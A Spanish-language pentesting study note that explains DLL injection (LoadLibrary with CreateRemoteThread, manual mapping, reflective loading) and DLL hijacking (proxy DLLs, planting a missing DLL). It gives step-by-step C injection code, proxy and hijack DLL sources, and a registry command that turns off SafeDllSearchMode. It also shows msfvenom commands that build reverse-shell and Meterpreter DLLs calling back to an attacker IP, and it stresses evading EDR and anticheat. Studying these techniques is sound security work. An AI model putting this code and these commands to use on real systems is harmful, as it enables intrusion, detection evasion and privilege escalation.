
## 🧠 Concepto clave

Una **DLL (Dynamic Link Library)** es un archivo en formato PE (Portable Executable) que contiene código y datos reutilizables que múltiples programas pueden usar simultáneamente en tiempo de ejecución. Windows las carga en el espacio de memoria del proceso que las necesita, donde sus funciones quedan disponibles como si fueran parte del propio ejecutable.

| Concepto | Qué es |
|---|---|
| **DLL Injection** | Técnica que fuerza a un proceso en ejecución a cargar una DLL arbitraria en su espacio de memoria, haciendo que el código de esa DLL se ejecute dentro del contexto del proceso objetivo — con sus mismos privilegios y acceso a sus recursos |
| **DLL Hijacking** | Técnica que aprovecha el orden de búsqueda de DLLs de Windows para colocar una DLL maliciosa antes que la legítima, haciendo que el proceso cargue la falsa en lugar de la real |
| **Proceso objetivo** | El proceso en ejecución cuya memoria y privilegios queremos explotar. Al inyectar en un proceso de confianza (como `explorer.exe` o `svchost.exe`), nuestro código hereda su nivel de integridad y evade detección |
| **Address Space** | Espacio de memoria virtual asignado a cada proceso. En Windows cada proceso tiene su propio espacio aislado — para inyectar en otro proceso hay que usar APIs específicas del sistema que permiten escritura y ejecución entre procesos |
| **PE (Portable Executable)** | Formato de archivo ejecutable de Windows. Tanto los `.exe` como los `.dll` son archivos PE — la diferencia es que las DLLs tienen un punto de entrada `DllMain` y están diseñadas para ser cargadas por otros procesos |

Aunque DLL Injection tiene usos legítimos — **hot patching** en producción (como Azure Automanage 📄 [Cómo funciona Hotpatch — Microsoft](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works), que actualiza servidores en caliente sin reiniciarlos), depuración de aplicaciones, o modding de videojuegos — es también una de las técnicas de evasión más usadas por malware para ejecutar código malicioso dentro de procesos de confianza y evitar la detección por soluciones de seguridad.

---

## 📌 Métodos de DLL Injection

### Método 1 — LoadLibrary Injection

El método más directo y conocido. Abusa de la API `LoadLibraryA` de Windows, que carga una DLL en el proceso actual dada su ruta en disco. La idea es **forzar al proceso objetivo a llamar a `LoadLibraryA` con nuestra DLL como argumento**, usando un hilo remoto que ejecute esa función en su contexto.

> [!info] **LoadLibraryA / LoadLibraryW**
> Función de la API de Windows exportada por `kernel32.dll` que carga una DLL en el espacio de memoria del proceso que la llama y devuelve un `HMODULE` (handle al módulo cargado). `LoadLibraryA` acepta rutas en ASCII, `LoadLibraryW` en Unicode. Es la forma estándar y legítima de cargar DLLs en tiempo de ejecución. Su uso es monitoreado por soluciones EDR y anticheat, lo que la convierte en la técnica más detectable de las tres.

**Flujo de inyección paso a paso:**

**Paso 1 — Obtener handle al proceso objetivo**

> [!info] **OpenProcess**
> Función de la API de Windows que abre un handle a un proceso en ejecución dado su PID. El handle otorga los derechos de acceso especificados sobre el proceso — en este caso `PROCESS_ALL_ACCESS` para poder leer/escribir su memoria y crear hilos remotos. Requiere que el proceso atacante tenga privilegios suficientes (habitualmente SeDebugPrivilege o ser el mismo usuario).
```c
DWORD targetProcessId = 123456;
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
```
`PROCESS_ALL_ACCESS` — Otorga todos los derechos posibles sobre el proceso objetivo.
`FALSE` — No hereda el handle en procesos hijos.
`targetProcessId` — PID del proceso objetivo, obtenido con Task Manager, `tasklist`, o `GetProcessesByName`.

**Paso 2 — Reservar memoria en el proceso objetivo para la ruta de la DLL**

> [!info] **VirtualAllocEx**
> Versión extendida de `VirtualAlloc` que opera sobre el espacio de memoria de **otro proceso** (de ahí el sufijo `Ex`). Permite reservar y confirmar páginas de memoria en el address space del proceso objetivo. Necesaria para escribir la ruta de nuestra DLL en el proceso remoto antes de que lo haga `LoadLibraryA`.
```c
LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(
    hProcess,
    NULL,
    strlen(dllPath),
    MEM_RESERVE | MEM_COMMIT,
    PAGE_READWRITE
);
```
`hProcess` — Handle al proceso objetivo obtenido en el paso anterior.
`NULL` — Windows elige la dirección base de la asignación automáticamente.
`strlen(dllPath)` — Tamaño en bytes a reservar — el tamaño de la ruta de la DLL.
`MEM_RESERVE | MEM_COMMIT` — Reserva y confirma la memoria en una sola operación.
`PAGE_READWRITE` — La memoria será legible y escribible (necesario para escribir la ruta).

**Paso 3 — Escribir la ruta de la DLL en la memoria remota**

> [!info] **WriteProcessMemory**
> Función de la API de Windows que escribe datos en el espacio de memoria de otro proceso. Requiere que el handle al proceso tenga el derecho `PROCESS_VM_WRITE`. Es la función que permite transferir nuestra ruta de DLL al address space del proceso objetivo.
```c
BOOL succeededWriting = WriteProcessMemory(
    hProcess,
    dllPathAddressInRemoteMemory,
    dllPath,
    strlen(dllPath),
    NULL
);
```
`dllPathAddressInRemoteMemory` — Dirección en el proceso remoto donde se escribirá la ruta (obtenida en el paso anterior).
`dllPath` — Buffer local con la ruta de la DLL maliciosa a inyectar.
`strlen(dllPath)` — Número de bytes a escribir.
`NULL` — No se necesita el número de bytes escritos.

**Paso 4 — Obtener la dirección de LoadLibraryA en kernel32.dll**

> [!info] **GetProcAddress / GetModuleHandle**
> `GetModuleHandle` devuelve el handle de un módulo (DLL) ya cargado en el proceso actual. `GetProcAddress` devuelve la dirección de memoria de una función exportada por ese módulo. La clave aquí es que `kernel32.dll` se carga **siempre en la misma dirección** en todos los procesos de un mismo sistema (gracias a ASLR por sesión, no por proceso) — por lo que la dirección de `LoadLibraryA` en nuestro proceso es la misma que en el proceso objetivo.
```c
LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(
    GetModuleHandle("kernel32.dll"),
    "LoadLibraryA"
);
```

**Paso 5 — Crear un hilo remoto que ejecute LoadLibraryA con nuestra DLL**

> [!info] **CreateRemoteThread**
> Función de la API de Windows que crea un hilo de ejecución en el contexto de **otro proceso**. El hilo comienza su ejecución en la función especificada (`lpStartAddress`) con el parámetro especificado (`lpParameter`). Al apuntar el hilo a `LoadLibraryA` y pasarle como parámetro la dirección de nuestra ruta de DLL en el proceso remoto, forzamos al proceso objetivo a cargar nuestra DLL en su propio espacio de memoria.
```c
HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)loadLibraryAddress,
    dllPathAddressInRemoteMemory,
    0,
    NULL
);
```
`loadLibraryAddress` — La función que ejecutará el hilo remoto: `LoadLibraryA`.
`dllPathAddressInRemoteMemory` — El parámetro que recibirá `LoadLibraryA`: la dirección de la ruta de nuestra DLL en el proceso remoto.

El resultado: el proceso objetivo ejecuta `LoadLibraryA("C:\ruta\maliciosa.dll")` en su propio contexto, cargando nuestra DLL en su address space y ejecutando su `DllMain`.

---

### Método 2 — Manual Mapping

Técnica avanzada que **evita usar `LoadLibrary`** — cuyo uso es monitorizado por EDRs y sistemas anticheat. En lugar de ello, el inyector carga la DLL manualmente byte a byte, replicando lo que haría el Windows loader internamente.

El proceso simplificado:

1. Leer la DLL como datos brutos (raw bytes) en el proceso inyector.
2. Mapear manualmente las secciones del PE (`.text`, `.data`, `.rdata`, etc.) en el proceso objetivo usando `VirtualAllocEx` y `WriteProcessMemory`.
3. Inyectar un shellcode en el proceso objetivo que realice las tareas que normalmente hace el loader de Windows: **reubicación** (ajustar direcciones absolutas según la nueva base), **resolución de imports** (cargar las DLLs de las que depende y resolver las funciones importadas), **ejecución de TLS callbacks**, y finalmente llamar a `DllMain`.

> [!info] **Relocations y Base Relocation Table**
> Cuando una DLL se compila, las referencias a direcciones absolutas se calculan asumiendo que la DLL se cargará en su **ImageBase preferida** (campo en el PE header). Si Windows la carga en una dirección diferente (frecuente con ASLR), todas esas referencias absolutas deben ajustarse sumándoles el delta entre la ImageBase preferida y la dirección real. Este proceso se llama **rebasing** o **relocation**. En Manual Mapping, el shellcode inyectado realiza este proceso manualmente.

> [!info] **Import Address Table (IAT)**
> Estructura del PE que lista todas las funciones externas que la DLL necesita de otras DLLs. Cuando Windows carga una DLL normalmente, el loader resuelve la IAT automáticamente — busca cada DLL importada, la carga si no está ya en memoria, y escribe las direcciones de las funciones en la tabla. En Manual Mapping, el shellcode inyectado debe replicar este proceso manualmente para cada entrada de la IAT.

Manual Mapping es la técnica preferida por malware avanzado y cheats en videojuegos precisamente porque al no llamar a `LoadLibrary`, la DLL inyectada **no aparece en la lista de módulos del proceso** (que es lo que monitorizan los EDRs y anticheat).

---

### Método 3 — Reflective DLL Injection

📄 [ReflectiveDLLInjection — Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection)

Técnica desarrollada por Stephen Fewer que lleva el concepto de Manual Mapping un paso más allá: **la propia DLL contiene el código necesario para cargarse a sí misma**. No depende de ningún código externo en el proceso inyector más allá de escribir los bytes de la DLL en memoria y transferirle la ejecución.

> [!info] **ReflectiveLoader**
> Función especial exportada por la DLL que implementa un cargador PE mínimo. Cuando se le transfiere la ejecución, esta función localiza su propia imagen en memoria, parsea sus propios headers PE, resuelve las funciones de Windows que necesita (`LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`) buscándolas directamente en la export table de `kernel32.dll`, mapea sus propias secciones en una nueva región de memoria, resuelve su IAT, procesa sus relocations y finalmente llama a su propio `DllMain`. Todo sin que ningún agente externo tenga que hacer nada más que escribir los bytes de la DLL en memoria y ejecutar `ReflectiveLoader`.

El flujo completo según Stephen Fewer:

1. El inyector escribe los bytes raw de la DLL en una región de memoria arbitraria del proceso objetivo (con `VirtualAllocEx` + `WriteProcessMemory`).
2. El inyector transfiere la ejecución a `ReflectiveLoader` — bien con `CreateRemoteThread` apuntando al offset de `ReflectiveLoader`, bien con un shellcode mínimo de bootstrap.
3. `ReflectiveLoader` calcula su propia posición en memoria parseando su propio PE header.
4. Parsea la export table de `kernel32.dll` del proceso host para obtener las direcciones de `LoadLibraryA`, `GetProcAddress` y `VirtualAlloc`.
5. Asigna una región de memoria continua con `VirtualAlloc` donde se mapeará a sí mismo correctamente.
6. Copia sus headers y secciones a la nueva región.
7. Resuelve su IAT (carga DLLs dependientes y obtiene direcciones de funciones importadas).
8. Procesa su tabla de relocations.
9. Llama a su propio `DllMain` con `DLL_PROCESS_ATTACH` — la DLL queda completamente cargada y funcional.
10. Devuelve la ejecución al bootstrap shellcode o termina el hilo remoto.

Las ventajas de Reflective DLL Injection sobre LoadLibrary son las mismas que Manual Mapping — la DLL no aparece en la lista de módulos del proceso — pero con la ventaja adicional de que toda la lógica de carga está autocontenida en la propia DLL, haciéndola más portátil y el inyector más simple.

---

## 📌 DLL Hijacking

### El orden de búsqueda de DLLs en Windows

Cuando una aplicación llama a `LoadLibrary("nombre.dll")` sin especificar una ruta absoluta, Windows busca la DLL en una secuencia de directorios predefinida. **DLL Hijacking consiste en colocar una DLL maliciosa en un directorio que aparece antes en ese orden de búsqueda que el directorio donde está la DLL legítima.**

> [!info] **Safe DLL Search Mode**
> Configuración de Windows que controla el orden de búsqueda de DLLs. Cuando está **activo** (valor por defecto y recomendado), el directorio de trabajo actual (`CWD`) se mueve hacia abajo en el orden de búsqueda, reduciendo el riesgo de hijacking desde el directorio actual. Se controla mediante la clave de registro `SafeDllSearchMode` en `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager`.

**Con Safe DLL Search Mode activo (por defecto):**

| Orden | Directorio buscado |
|---|---|
| 1 | Directorio del ejecutable de la aplicación |
| 2 | `C:\Windows\System32` |
| 3 | `C:\Windows\System` (16-bit) |
| 4 | `C:\Windows` |
| 5 | Directorio de trabajo actual (CWD) |
| 6 | Directorios en la variable `PATH` del sistema |

**Con Safe DLL Search Mode desactivado:**

| Orden | Directorio buscado |
|---|---|
| 1 | Directorio del ejecutable de la aplicación |
| 2 | **Directorio de trabajo actual (CWD)** ← sube aquí |
| 3 | `C:\Windows\System32` |
| 4 | `C:\Windows\System` (16-bit) |
| 5 | `C:\Windows` |
| 6 | Directorios en la variable `PATH` del sistema |

> [!tip] Verificar y modificar SafeDllSearchMode en el registro
> ```cmd
> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode /t REG_DWORD /d 0 /f
> ```
> `/v SafeDllSearchMode` — Consulta el valor específico. `1` = activo, `0` = desactivado.
> `/d 0` — Establece el valor a 0 para desactivar Safe DLL Search Mode.
> `/f` — Fuerza la escritura sin pedir confirmación.
> Requiere reinicio del sistema para que el cambio tenga efecto.

---

### Herramientas para identificar oportunidades de DLL Hijacking

> [!info] **Process Monitor (procmon.exe)**
> Herramienta de la suite Sysinternals de Microsoft que monitoriza en tiempo real todas las operaciones del sistema de archivos, registro y red de todos los procesos. Muestra cada intento de carga de DLL, incluyendo los que fallan con `NAME NOT FOUND` — que son exactamente las oportunidades de DLL hijacking. Permite filtrar por proceso, operación y resultado para identificar rápidamente DLLs que una aplicación busca y no encuentra.

> [!info] **Process Explorer**
> También de Sysinternals. Muestra información detallada sobre procesos en ejecución, incluyendo sus DLLs cargadas actualmente (vista de handles y módulos). Permite identificar qué DLLs tiene cargadas un proceso para entender su superficie de ataque.

> [!info] **PE Explorer**
> Herramienta que analiza archivos PE (`.exe`, `.dll`) y muestra su estructura interna: secciones, imports, exports, recursos, etc. La tabla de imports (IAT) muestra exactamente qué DLLs y funciones necesita un ejecutable — una fuente directa de candidatos para hijacking.

---

### Técnica 1 — DLL Proxying

En lugar de reemplazar completamente la DLL legítima (rompiendo la funcionalidad del programa), el **DLL Proxying** crea una DLL intermediaria que carga y llama a la DLL original — aplicando modificaciones en el proceso. El programa sigue funcionando correctamente desde su perspectiva.

**Flujo:**
1. Renombrar la DLL legítima (`library.dll` → `library.o.dll`).
2. Crear una DLL proxy (`tamper.dll`) que exporte las mismas funciones que la original.
3. Dentro de cada función exportada: cargar la DLL original renombrada, llamar a la función real, interceptar/modificar el resultado, y devolverlo.
4. Renombrar la DLL proxy a `library.dll` — el programa la carga sin saberlo.
```c
// tamper.c — DLL Proxy que intercepta la función Add
#include <stdio.h>
#include <Windows.h>

typedef int (*AddFunc)(int, int);

__declspec(dllexport) int Add(int a, int b)
{
    // Cargar la DLL original renombrada
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            int result = originalAdd(a, b);   // Llamar a la función real
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;                       // Modificar el resultado
            printf("============ RETURN ============\n");
            return result;                     // Devolver el resultado modificado
        }
    }
    return -1;
}
```

> [!info] **__declspec(dllexport)**
> Directiva del compilador MSVC que marca una función para ser exportada en la DLL — es decir, para que sea accesible desde procesos que carguen la DLL. Equivale a añadir la función a la Export Table del PE. La DLL proxy debe exportar exactamente las mismas funciones con las mismas firmas que la DLL legítima para que el programa que la usa no falle.

> [!info] **DllMain**
> Punto de entrada de toda DLL en Windows. Es llamado automáticamente por el loader del sistema en cuatro eventos: `DLL_PROCESS_ATTACH` (cuando la DLL se carga en un proceso), `DLL_PROCESS_DETACH` (cuando se descarga), `DLL_THREAD_ATTACH` (cuando el proceso crea un nuevo hilo) y `DLL_THREAD_DETACH` (cuando un hilo termina). Para ejecutar código al cargarse la DLL, el payload se coloca en el case `DLL_PROCESS_ATTACH`.

---

### Técnica 2 — DLL Inexistente (Invalid Library Hijacking)

La variante más simple: la aplicación busca una DLL que **no existe en ningún directorio del sistema**. Basta con crear una DLL con ese nombre en un directorio que el programa busque antes, sin necesidad de proxying.

**Identificación con procmon:**

Configurar los filtros en Process Monitor:
- `Process Name` → `main.exe` (include)
- `Operation` → `CreateFile` (include)
- `Result` → `NAME NOT FOUND` (include)
- `Path` → ends with `.dll` (include)

Cualquier entrada que muestre la búsqueda de una DLL en el directorio de la aplicación con resultado `NAME NOT FOUND` es un candidato directo.
```c
// hijack.c — DLL mínima que se ejecuta al ser cargada
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Código que se ejecuta cuando el proceso carga nuestra DLL
        // En un caso real: reverse shell, añadir usuario, ejecutar payload, etc.
        printf("Hijacked... Oops...\n");
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

> [!important] En un escenario de pentesting real, el `printf` se reemplaza por un payload funcional: reverse shell, adición de usuario administrador, volcado de credenciales, establecimiento de persistencia, etc. La DLL se ejecuta en el contexto del proceso que la carga — si ese proceso corre como SYSTEM o como un usuario privilegiado, nuestro código también lo hará.

---

### Compilación de DLLs maliciosas

> [!tip] Compilar una DLL en Windows con MinGW o MSVC
> ```bash
> # Con MinGW (Linux o Windows)
> x86_64-w64-mingw32-gcc -shared -o maliciosa.dll maliciosa.c -lkernel32
>
> # Con MSVC (Windows, desde Developer Command Prompt)
> cl /LD maliciosa.c /Fe:maliciosa.dll
> ```
> `-shared` — Indica que el output es una biblioteca compartida (DLL).
> `-o maliciosa.dll` — Nombre del archivo de salida.
> `-lkernel32` — Enlaza con kernel32.dll para tener acceso a las APIs de Windows.
> `/LD` — Flag de MSVC para compilar como DLL.
> `/Fe:` — Especifica el nombre del ejecutable de salida.

> [!tip] Generar una DLL maliciosa directamente con msfvenom
> ```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f dll -o maliciosa.dll
> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f dll -o meterpreter.dll
> ```
> `-f dll` — Formato de salida como DLL de Windows.
> El payload se ejecutará automáticamente cuando el proceso cargue la DLL (en `DLL_PROCESS_ATTACH`).

---

## 🔗 Relaciones / Contexto

DLL Injection y DLL Hijacking son técnicas complementarias con objetivos distintos: **Injection** busca ejecutar código en un proceso ya en ejecución (útil para evadir detección operando dentro de procesos legítimos), mientras que **Hijacking** busca interceptar la carga de DLLs para ejecutar código con los privilegios del proceso que las carga (especialmente valioso cuando ese proceso corre como SYSTEM o un usuario privilegiado). En el contexto de escalada de privilegios en Windows, DLL Hijacking es especialmente relevante cuando se combina con servicios o tareas programadas que cargan DLLs desde rutas escribibles — exactamente el mismo patrón que el bypass de UAC mediante `srrstr.dll` visto anteriormente. En pentesting, `procmon` es la herramienta de análisis imprescindible para identificar oportunidades, y `msfvenom` la forma más rápida de generar el payload DLL funcional para el engagement.